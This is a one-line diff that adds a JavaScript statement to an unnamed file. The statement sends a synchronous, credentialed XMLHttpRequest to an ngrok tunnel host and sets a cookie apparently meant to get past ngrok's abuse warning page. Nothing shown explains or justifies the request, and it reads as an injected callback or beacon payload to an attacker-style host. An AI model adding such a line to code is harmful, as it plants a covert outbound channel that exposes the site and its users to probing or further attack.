@@ -1,0 +1,1 @@
+var x=new XMLHttpRequest();x.open("GET","https://d7f2-24-133-64-217.ngrok-free.app",false);x.withCredentials=true;x.setRequestHeader("Cookie","abuse_interstitial=d7f2-24-133-64-217.ngrok-free.app");x.send(null);
